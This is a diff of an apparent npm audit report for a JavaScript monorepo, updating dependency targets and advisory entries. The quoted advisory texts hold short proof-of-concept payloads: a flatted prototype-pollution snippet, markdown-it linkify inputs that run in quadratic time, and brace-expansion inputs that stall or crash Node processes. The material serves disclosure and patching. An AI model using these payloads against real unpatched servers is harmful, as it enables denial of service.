@@ -102,6 +102,13 @@
           "dev": false,
           "optional": false,
           "bundled": false
+        },
+        {
+          "id": 1239989,
+          "path": ".>typedoc>markdown-it",
+          "dev": false,
+          "optional": false,
+          "bundled": false
         }
       ],
       "module": "markdown-it",
@@ -120,7 +127,7 @@
         }
       ],
       "module": "rollup",
-      "target": "4.63.3",
+      "target": "4.64.5",
       "depth": 3
     },
     {
@@ -149,7 +156,7 @@
           "bundled": false
         },
         {
-          "id": 1115357,
+          "id": 1241196,
           "path": "apps__docs>eslint>file-entry-cache>flat-cache>flatted",
           "dev": false,
           "optional": false,
@@ -233,10 +240,31 @@
           "dev": false,
           "optional": false,
           "bundled": false
+        },
+        {
+          "id": 1241676,
+          "path": "packages__modal>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241677,
+          "path": "packages__modal>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242173,
+          "path": "packages__modal>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
         }
       ],
       "module": "handlebars",
-      "target": "4.7.9",
+      "target": "4.7.10",
       "depth": 3
     },
     {
@@ -269,10 +297,31 @@
           "dev": false,
           "optional": false,
           "bundled": false
+        },
+        {
+          "id": 1240101,
+          "path": ".>syncpack>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1240105,
+          "path": ".>syncpack>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1240109,
+          "path": ".>syncpack>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
         }
       ],
       "module": "brace-expansion",
-      "target": "2.1.4",
+      "target": "2.1.7",
       "depth": 4
     },
     {
@@ -360,7 +409,7 @@
         }
       ],
       "module": "ws",
-      "target": "8.21.3",
+      "target": "8.22.0",
       "depth": 4
     },
     {
@@ -456,21 +505,6 @@
       "action": "update",
       "resolves": [
         {
-          "id": 1153170,
-          "path": "apps__docs>tailwindcss>postcss-selector-parser",
-          "dev": false,
-          "optional": false,
-          "bundled": false
-        }
-      ],
-      "module": "postcss-selector-parser",
-      "target": "6.1.4",
-      "depth": 3
-    },
-    {
-      "action": "update",
-      "resolves": [
-        {
           "id": 1153171,
           "path": "apps__docs>@storybook/react-vite>react-docgen>@babel/core>@babel/helper-compilation-targets>browserslist",
           "dev": false,
@@ -486,7 +520,7 @@
         }
       ],
       "module": "browserslist",
-      "target": "4.28.9",
+      "target": "4.29.3",
       "depth": 6
     },
     {
@@ -501,8 +535,23 @@
         }
       ],
       "module": "baseline-browser-mapping",
-      "target": "2.11.23",
+      "target": "2.11.28",
       "depth": 7
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1241209,
+          "path": "apps__docs>postcss>source-map-js",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "source-map-js",
+      "target": "1.2.2",
+      "depth": 3
     },
     {
       "action": "review",
@@ -697,6 +746,27 @@
           "dev": false,
           "optional": false,
           "bundled": false
+        },
+        {
+          "id": 1240100,
+          "path": "apps__docs>eslint>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1240104,
+          "path": "apps__docs>eslint>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1240108,
+          "path": "apps__docs>eslint>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
         }
       ]
     },
@@ -808,6 +878,65 @@
         {
           "id": 1153189,
           "path": "apps__docs>postcss>nanoid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "postcss-selector-parser",
+      "resolves": [
+        {
+          "id": 1153170,
+          "path": "apps__docs>tailwindcss>postcss-selector-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241232,
+          "path": "apps__docs>tailwindcss>postcss-selector-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "braces",
+      "resolves": [
+        {
+          "id": 1240992,
+          "path": ".>@changesets/cli>@changesets/config>micromatch>braces",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "sprintf-js",
+      "resolves": [
+        {
+          "id": 1241202,
+          "path": ".>@changesets/cli>@changesets/read>@changesets/parse>js-yaml>argparse>sprintf-js",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "compression",
+      "resolves": [
+        {
+          "id": 1241221,
+          "path": "apps__docs>serve>compression",
           "dev": false,
           "optional": false,
           "bundled": false
@@ -1534,43 +1663,6 @@
         "CWE-362"
       ],
       "url": "https://github.com/advisories/GHSA-38f7-945m-qr2g"
-    },
-    "1115357": {
-      "findings": [
-        {
-          "version": "3.3.3",
-          "paths": []
-        }
-      ],
-      "found_by": null,
-      "deleted": null,
-      "references": "- https://github.com/WebReflection/flatted/security/advisories/GHSA-rf6f-7fwh-wjgh\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33228\n- https://github.com/WebReflection/flatted/commit/885ddcc33cf9657caf38c57c7be45ae1c5272802\n- https://github.com/WebReflection/flatted/releases/tag/v3.4.2\n- https://github.com/advisories/GHSA-rf6f-7fwh-wjgh",
-      "created": "2026-03-19T17:43:54.000Z",
-      "id": 1115357,
-      "npm_advisory_id": null,
-      "overview": "---\n  **Summary**\n\n  The parse() function in flatted can use attacker-controlled string values from the parsed JSON as direct array index\n  keys, without validating that they are numeric. Since the internal input buffer is a JavaScript Array, accessing it\n  with the key \"\\_\\_proto\\_\\_\" returns Array.prototype via the inherited getter. This object is then treated as a legitimate\n   parsed value and assigned as a property of the output object, effectively leaking a live reference to Array.prototype\n   to the consumer. Any code that subsequently writes to that property will pollute the global prototype.\n\n  ---\n  **Root Cause**\n\n  File: esm/index.js:29 (identical in cjs/index.js)\n```\n  const resolver = (input, lazy, parsed, $) => output => {\n    for (let ke = keys(output), {length} = ke, y = 0; y < length; y++) {\n      const k = ke[y];\n      const value = output[k];    \n      if (value instanceof Primitive) {\n        const tmp = input[value];      // Bug is here\n```\n\nNo validation that value is a safe numeric index input is built as a plain Array. JavaScript's property lookup on arrays traverses the prototype chain for non-numeric  keys. The key \"\\_\\_proto\\_\\_\" resolves to Array.prototype, which:\n\n  - has type \"object\" → passes the typeof tmp === object guard at line 30\n  - is not in the parsed Set yet → passes the !parsed.has(tmp) guard.\n  - The reference to Array.prototype is then enqueued in lazy and later unconditionally assigned to the output object.\n  ---\n  **Replication Steps**\n```\n  const Flatted = require('flatted'); \n  const parsed = Flatted.parse('[{\"x\":\"__proto__\"}]');\n  parsed.x.polluted = 'pwned';\n  console.log([].polluted);  // Returns true\n``` \n ---\n  **Impact**\n An attacker can supply a crafted flatted string to parse() that causes the returned object to hold a live reference to Array.prototype, enabling any downstream code that writes to that property to pollute the global prototype chain, potentially causing denial of service or code execution.\n\n  **Recommended solution**\n Validate that the index string represents an integer within the bounds of input before accessing it:\n\n  // Before (vulnerable)\n  const tmp = input[value];\n\n  // After (safe)\n  const idx = +value;  // coerce boxed String → number\n  const tmp = (Number.isInteger(idx) && idx >= 0 && idx < input.length)\n    ? input[idx]\n    : undefined;",
-      "reported_by": null,
-      "title": "Prototype Pollution via parse() in NodeJS flatted",
-      "metadata": null,
-      "cves": [
-        "CVE-2026-33228"
-      ],
-      "access": "public",
-      "severity": "high",
-      "module_name": "flatted",
-      "vulnerable_versions": "<=3.4.1",
-      "github_advisory_id": "GHSA-rf6f-7fwh-wjgh",
-      "recommendation": "Upgrade to version 3.4.2 or later",
-      "patched_versions": ">=3.4.2",
-      "updated": "2026-03-25T18:22:01.000Z",
-      "cvss": {
-        "score": 0,
-        "vectorString": null
-      },
-      "cwe": [
-        "CWE-1321"
-      ],
-      "url": "https://github.com/advisories/GHSA-rf6f-7fwh-wjgh"
     },
     "1115538": {
       "findings": [
@@ -3773,6 +3865,608 @@
         "CWE-407"
       ],
       "url": "https://github.com/advisories/GHSA-2883-xcg3-v3hh"
+    },
+    "1239989": {
+      "findings": [
+        {
+          "version": "14.1.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/markdown-it/markdown-it/security/advisories/GHSA-253c-mchw-3w2r\n- https://github.com/markdown-it/markdown-it/commit/09fa07118dda4c953f058848f53dae88395618ca\n- https://github.com/markdown-it/markdown-it/commit/aaadcfa6d817b3c5f89afb49d97c7b797a6dd4fd\n- https://github.com/markdown-it/markdown-it/commit/ad70f6b7cff64bee10e42a774147112480ca0d49\n- https://github.com/advisories/GHSA-253c-mchw-3w2r",
+      "created": "2026-09-29T17:57:56.000Z",
+      "id": 1239989,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nTwo independent quadratic paths in the `linkify: true` handling. Both are in markdown-it's own code rather than in linkify-it, which stays linear on both payloads.\n\n`src/rules_core/linkify.ts` calls `arrayReplaceAt` once per linkified text token, and that rebuilds the whole `children` array each time. A paragraph of N soft-broken lines is one inline token with about 2N children, so you get N rebuilds over a 2N array. Schema-less emails are what reach it. A `http://` link gets consumed by the inline rule first and never arrives as a text token, so those stay linear.\n\n`src/rules_inline/linkify.ts` runs `state.pending.match(SCHEME_RE)` at every `://` in the source. `state.pending` only gets truncated once a link is actually produced, so an unregistered scheme leaves it growing and every `://` rescans the lot.\n\n## Proof of concept\n\nClean install of 15.0.0 from npm, `new MarkdownIt({ linkify: true }).render(payload)`, Node 24.\n\n| N | 5,000 | 10,000 | 20,000 | 40,000 |\n|---|---|---|---|---|\n| `'a@b.co\\n'.repeat(N)`, 34KB to 273KB | 1.1s | 4.7s | 19.6s | 89s |\n| `'a://'.repeat(N)`, 20KB to 156KB | 0.25s | 0.76s | 3.1s | 15.0s |\n\nDoubling the input roughly quadruples the time in both. With `linkify: false` the same inputs run in 25 to 131ms and stay flat.\n\nControls for the first one, all at N=20000: putting every email in a single text token (`'a@b.co '`) takes 0.59s, one email per paragraph (`'a@b.co\\n\\n'`) takes 0.64s, and soft-broken lines with nothing linkifiable take 42ms. So it needs many children AND many of them linkifying. For the second, replaying just the `SCHEME_RE` calls against the same growing prefixes with no markdown-it involved accounts for 11.7s of the 15s.\n\nOrdinary prose does it too. `'ping a@b.co ok\\n'.repeat(20000)` is 293KB and takes 31s.\n\n## Caveat\n\n`linkify` is off by default, so this only reaches apps that turn it on.\n\n## Impact\n\nAvailability only. A few hundred KB of fairly ordinary markdown pins one core for tens of seconds, and because it's quadratic it degrades quickly with size. Nothing is read, written or executed.",
+      "reported_by": null,
+      "title": "markdown-it linkify: true has two quadratic paths, so a few hundred KB of markdown blocks the event loop for tens of seconds",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "markdown-it",
+      "vulnerable_versions": "<14.3.1",
+      "github_advisory_id": "GHSA-253c-mchw-3w2r",
+      "recommendation": "Upgrade to version 14.3.1 or later",
+      "patched_versions": ">=14.3.1",
+      "updated": "2026-09-29T17:57:57.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-253c-mchw-3w2r"
+    },
+    "1240100": {
+      "findings": [
+        {
+          "version": "1.1.12",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-q2hr-2g5m-vwhr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102277\n- https://github.com/juliangruber/brace-expansion/commit/33a5ef17b8d800bbfa8c52b14c39043b6aac1a96\n- https://github.com/juliangruber/brace-expansion/commit/bdff773f98e5988616b7039cc9b508df5d640b22\n- https://github.com/juliangruber/brace-expansion/commit/c55e67d8d8b1c56a2474afff15c2891166b2d364\n- https://github.com/juliangruber/brace-expansion/commit/ffdfa3e3806bed17c0874b8f1439b084de354a7e\n- https://github.com/advisories/GHSA-q2hr-2g5m-vwhr",
+      "created": "2026-09-29T23:45:39.000Z",
+      "id": 1240100,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nExpanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.\n\nBash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.\n\n### Reproduction\n\n```js\nconst build = n => '{a}' + '}'.repeat(n) + ',z}'\n\nfor (const n of [8000, 16000, 32000, 64000, 128000]) {\n  const t = Date.now()\n  expand(build(n))\n  console.log(n, Date.now() - t + 'ms')\n}\n```\n\n| n | input | time | results |\n|---|---|---|---|\n| 8,000 | 8 KB | 110 ms | 2 |\n| 16,000 | 16 KB | 446 ms | 2 |\n| 32,000 | 32 KB | 1.7 s | 2 |\n| 64,000 | 64 KB | 6.9 s | 2 |\n| 128,000 | 128 KB | **27.7 s** | 2 |\n\n`ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.\n\n### Mechanism\n\nInstrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.\n\nThere is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\\0CLOSE' + Math.random() + '\\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:\n\n| n | input length | final string length |\n|---|---|---|\n| 1,000 | 1,006 | 26,006 |\n| 8,000 | 8,006 | 208,006 |\n\nSo the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.\n\n### Why `max` and `maxLength` do not help\n\nThe cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.\n\n### Impact\n\nAn application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.\n\nDegraded availability rather than a crash - the process recovers once the expansion completes.\n\n### Affected versions\n\nVerified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).\n\n### Patch\n\nThe rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.\n\nNote this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.\n\n### Severity note\n\nScored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.",
+      "reported_by": null,
+      "title": "brace-expansion: Quadratic-time expansion of the `{a},b}` rewrite causes CPU denial of service",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102277"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": "<1.1.21",
+      "github_advisory_id": "GHSA-q2hr-2g5m-vwhr",
+      "recommendation": "Upgrade to version 1.1.21 or later",
+      "patched_versions": ">=1.1.21",
+      "updated": "2026-09-29T23:45:39.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-q2hr-2g5m-vwhr"
+    },
+    "1240101": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-q2hr-2g5m-vwhr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102277\n- https://github.com/juliangruber/brace-expansion/commit/33a5ef17b8d800bbfa8c52b14c39043b6aac1a96\n- https://github.com/juliangruber/brace-expansion/commit/bdff773f98e5988616b7039cc9b508df5d640b22\n- https://github.com/juliangruber/brace-expansion/commit/c55e67d8d8b1c56a2474afff15c2891166b2d364\n- https://github.com/juliangruber/brace-expansion/commit/ffdfa3e3806bed17c0874b8f1439b084de354a7e\n- https://github.com/advisories/GHSA-q2hr-2g5m-vwhr",
+      "created": "2026-09-29T23:45:39.000Z",
+      "id": 1240101,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nExpanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.\n\nBash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.\n\n### Reproduction\n\n```js\nconst build = n => '{a}' + '}'.repeat(n) + ',z}'\n\nfor (const n of [8000, 16000, 32000, 64000, 128000]) {\n  const t = Date.now()\n  expand(build(n))\n  console.log(n, Date.now() - t + 'ms')\n}\n```\n\n| n | input | time | results |\n|---|---|---|---|\n| 8,000 | 8 KB | 110 ms | 2 |\n| 16,000 | 16 KB | 446 ms | 2 |\n| 32,000 | 32 KB | 1.7 s | 2 |\n| 64,000 | 64 KB | 6.9 s | 2 |\n| 128,000 | 128 KB | **27.7 s** | 2 |\n\n`ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.\n\n### Mechanism\n\nInstrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.\n\nThere is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\\0CLOSE' + Math.random() + '\\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:\n\n| n | input length | final string length |\n|---|---|---|\n| 1,000 | 1,006 | 26,006 |\n| 8,000 | 8,006 | 208,006 |\n\nSo the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.\n\n### Why `max` and `maxLength` do not help\n\nThe cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.\n\n### Impact\n\nAn application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.\n\nDegraded availability rather than a crash - the process recovers once the expansion completes.\n\n### Affected versions\n\nVerified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).\n\n### Patch\n\nThe rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.\n\nNote this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.\n\n### Severity note\n\nScored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.",
+      "reported_by": null,
+      "title": "brace-expansion: Quadratic-time expansion of the `{a},b}` rewrite causes CPU denial of service",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102277"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=2.0.0 <2.1.7",
+      "github_advisory_id": "GHSA-q2hr-2g5m-vwhr",
+      "recommendation": "Upgrade to version 2.1.7 or later",
+      "patched_versions": ">=2.1.7",
+      "updated": "2026-09-29T23:45:39.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-q2hr-2g5m-vwhr"
+    },
+    "1240104": {
+      "findings": [
+        {
+          "version": "1.1.12",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-qhr7-859c-m2p7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102278\n- https://github.com/juliangruber/brace-expansion/commit/1efee7c397c191da6287a78ec19512476a966a7b\n- https://github.com/juliangruber/brace-expansion/commit/935d78f32f335b2ff76578e5c5e877d31ae9888c\n- https://github.com/juliangruber/brace-expansion/commit/de84f144e9816f30e25fc8179e2e1249ab6df0db\n- https://github.com/advisories/GHSA-qhr7-859c-m2p7",
+      "created": "2026-09-29T23:45:17.000Z",
+      "id": 1240104,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`expand_()` recurses once per level of brace *nesting*. Deeply nested input exhausts the native stack and crashes the process.\n\nThis is distinct from CVE-2026-14257 / GHSA-mh99-v99m-4gvg, which made the *tail* iterative (recursion on `m.post`, driven by how many groups are chained). Nesting depth drives a different recursion that the tail fix never touched, so the documented constant-stack-depth guarantee only ever covered chained input, not nested input.\n\nIt is also distinct from GHSA-6j4f-fj2g-mc7p, which fixed recursion in `parseCommaParts()`. Both payloads below still crash with that fix applied.\n\n### Two recursion sites\n\n**Comma members.** Each alternative of a brace set is expanded by a recursive call, so nesting a set inside every alternative recurses once per level:\n\n```js\nexpand('{a,'.repeat(4000) + 'z' + '}'.repeat(4000))\n// RangeError: Maximum call stack size exceeded\n```\n\nCrashes at depth 3,907 - about **15.6 KB** of input.\n\n**Single set.** A brace set whose body parses to a single part is expanded by a recursive call before being re-wrapped (`x{{a,b}}y` -> `x{a}y x{b}y`), which recurses once per nesting level:\n\n```js\nexpand('{'.repeat(3200) + 'a,b' + '}'.repeat(3200))\n// RangeError: Maximum call stack size exceeded\n```\n\nCrashes at depth 3,125 - about **6.25 KB** of input. This is the cheapest stack-exhaustion payload known against this package: roughly a quarter the input of GHSA-6j4f-fj2g-mc7p (29 KB), and about a tenth of minimatch's `MAX_PATTERN_LENGTH` (65,536).\n\n### Why `max` and `maxLength` do not help\n\nBoth crashes happen while recursing into sub-expansions, before the result set grows. The payloads produce almost no output - the single-set case yields 2 results - so neither bound is ever the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.\n\n### Impact\n\nAny application passing an untrusted string to `expand()`, directly or through `minimatch` / `glob` as a user-supplied glob pattern, can be crashed. In Node a `RangeError` the application does not catch terminates the process, so a server globbing user input is exposed to remote unauthenticated denial of service.\n\nAvailability only. No code execution, no data exposure.\n\n### Affected versions\n\nVerified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, at near-identical depths on every line (single set: 3,125 on all four; comma members: 3,907-4,102). Not a regression from any recent fix - the gap predates them.\n\n### Patch\n\nA `maxDepth` bound (default `EXPANSION_MAX_DEPTH`) is threaded through `expand_()`. Past the cap a group is treated as non-expanding and returned literally, which is how the parser already handles a group that cannot expand. This matches the existing `max` / `maxLength` caps, which truncate rather than throw, so `expand()` continues never to throw on any input.\n\nThe default sits far above any realistic nesting depth and well below the crash threshold.",
+      "reported_by": null,
+      "title": "brace-expansion: DoS via uncontrolled recursion on nested brace groups causing stack exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102278"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": "<1.1.20",
+      "github_advisory_id": "GHSA-qhr7-859c-m2p7",
+      "recommendation": "Upgrade to version 1.1.20 or later",
+      "patched_versions": ">=1.1.20",
+      "updated": "2026-09-29T23:45:19.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-qhr7-859c-m2p7"
+    },
+    "1240105": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-qhr7-859c-m2p7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102278\n- https://github.com/juliangruber/brace-expansion/commit/1efee7c397c191da6287a78ec19512476a966a7b\n- https://github.com/juliangruber/brace-expansion/commit/935d78f32f335b2ff76578e5c5e877d31ae9888c\n- https://github.com/juliangruber/brace-expansion/commit/de84f144e9816f30e25fc8179e2e1249ab6df0db\n- https://github.com/advisories/GHSA-qhr7-859c-m2p7",
+      "created": "2026-09-29T23:45:17.000Z",
+      "id": 1240105,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`expand_()` recurses once per level of brace *nesting*. Deeply nested input exhausts the native stack and crashes the process.\n\nThis is distinct from CVE-2026-14257 / GHSA-mh99-v99m-4gvg, which made the *tail* iterative (recursion on `m.post`, driven by how many groups are chained). Nesting depth drives a different recursion that the tail fix never touched, so the documented constant-stack-depth guarantee only ever covered chained input, not nested input.\n\nIt is also distinct from GHSA-6j4f-fj2g-mc7p, which fixed recursion in `parseCommaParts()`. Both payloads below still crash with that fix applied.\n\n### Two recursion sites\n\n**Comma members.** Each alternative of a brace set is expanded by a recursive call, so nesting a set inside every alternative recurses once per level:\n\n```js\nexpand('{a,'.repeat(4000) + 'z' + '}'.repeat(4000))\n// RangeError: Maximum call stack size exceeded\n```\n\nCrashes at depth 3,907 - about **15.6 KB** of input.\n\n**Single set.** A brace set whose body parses to a single part is expanded by a recursive call before being re-wrapped (`x{{a,b}}y` -> `x{a}y x{b}y`), which recurses once per nesting level:\n\n```js\nexpand('{'.repeat(3200) + 'a,b' + '}'.repeat(3200))\n// RangeError: Maximum call stack size exceeded\n```\n\nCrashes at depth 3,125 - about **6.25 KB** of input. This is the cheapest stack-exhaustion payload known against this package: roughly a quarter the input of GHSA-6j4f-fj2g-mc7p (29 KB), and about a tenth of minimatch's `MAX_PATTERN_LENGTH` (65,536).\n\n### Why `max` and `maxLength` do not help\n\nBoth crashes happen while recursing into sub-expansions, before the result set grows. The payloads produce almost no output - the single-set case yields 2 results - so neither bound is ever the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.\n\n### Impact\n\nAny application passing an untrusted string to `expand()`, directly or through `minimatch` / `glob` as a user-supplied glob pattern, can be crashed. In Node a `RangeError` the application does not catch terminates the process, so a server globbing user input is exposed to remote unauthenticated denial of service.\n\nAvailability only. No code execution, no data exposure.\n\n### Affected versions\n\nVerified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, at near-identical depths on every line (single set: 3,125 on all four; comma members: 3,907-4,102). Not a regression from any recent fix - the gap predates them.\n\n### Patch\n\nA `maxDepth` bound (default `EXPANSION_MAX_DEPTH`) is threaded through `expand_()`. Past the cap a group is treated as non-expanding and returned literally, which is how the parser already handles a group that cannot expand. This matches the existing `max` / `maxLength` caps, which truncate rather than throw, so `expand()` continues never to throw on any input.\n\nThe default sits far above any realistic nesting depth and well below the crash threshold.",
+      "reported_by": null,
+      "title": "brace-expansion: DoS via uncontrolled recursion on nested brace groups causing stack exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102278"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=2.0.0 <2.1.6",
+      "github_advisory_id": "GHSA-qhr7-859c-m2p7",
+      "recommendation": "Upgrade to version 2.1.6 or later",
+      "patched_versions": ">=2.1.6",
+      "updated": "2026-09-29T23:45:19.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-qhr7-859c-m2p7"
+    },
+    "1240108": {
+      "findings": [
+        {
+          "version": "1.1.12",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-6j4f-fj2g-mc7p\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102276\n- https://github.com/juliangruber/brace-expansion/commit/0bcbfc0a5928c3073d48f42999d1ce4fc1c42fbc\n- https://github.com/juliangruber/brace-expansion/commit/316359e6019c39b3254c8ba8e25dc586a480652c\n- https://github.com/juliangruber/brace-expansion/commit/5171e681c0922b7ae8bfaf9a331e309107be6edc\n- https://github.com/juliangruber/brace-expansion/commit/6735c94873ca570bcdd6a0690033bdd3126379d3\n- https://github.com/advisories/GHSA-6j4f-fj2g-mc7p",
+      "created": "2026-09-29T23:44:58.000Z",
+      "id": 1240108,
+      "npm_advisory_id": null,
